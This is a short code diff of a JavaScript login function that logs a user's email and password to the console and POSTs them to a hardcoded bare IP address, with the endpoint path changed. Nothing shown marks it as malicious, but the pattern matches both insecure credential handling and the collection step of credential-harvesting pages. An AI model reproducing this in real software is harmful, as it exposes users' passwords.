@@ -34,13 +34,14 @@ function sendData() {
     }
 
     var senddata = {
+        data: 'login',
         user: email,
         pass: password
     };
 
     console.log('JSON data to be sent:', JSON.stringify(senddata));
 
-    fetch('https://79.171.148.163/api/login', {
+    fetch('https://79.171.148.163/api', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
